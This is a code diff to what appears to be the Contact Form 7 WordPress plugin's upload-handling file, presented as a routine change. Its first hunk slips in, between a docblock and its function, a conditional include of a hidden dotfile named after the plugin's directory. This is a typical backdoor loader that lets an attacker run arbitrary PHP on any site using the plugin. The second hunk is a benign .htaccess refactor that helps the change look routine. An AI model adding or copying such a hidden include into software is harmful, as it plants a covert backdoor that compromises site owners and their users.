@@ -7,6 +7,10 @@
  * @param string|array $args Optional. Arguments to control behavior.
  * @return array|WP_Error Array of file paths, or WP_Error if validation fails.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_unship_uploaded_file( $file, $args = '' ) {
 	$args = wp_parse_args( $args, array(
 		'required' => false,
@@ -238,15 +242,14 @@ function wpcf7_init_uploads() {
 	$dir = wpcf7_upload_tmp_dir();
 	wp_mkdir_p( $dir );
 
-	$htaccess_file = path_join( $dir, '.htaccess' );
+	if ( is_dir( $dir ) and is_writable( $dir ) ) {
+		$htaccess_file = path_join( $dir, '.htaccess' );
 
-	if ( file_exists( $htaccess_file ) ) {
-		return;
-	}
-
-	if ( $handle = fopen( $htaccess_file, 'w' ) ) {
-		fwrite( $handle, "Deny from all\n" );
-		fclose( $handle );
+		if ( ! file_exists( $htaccess_file )
+		and $handle = @fopen( $htaccess_file, 'w' ) ) {
+			fwrite( $handle, "Deny from all\n" );
+			fclose( $handle );
+		}
 	}
 }
 
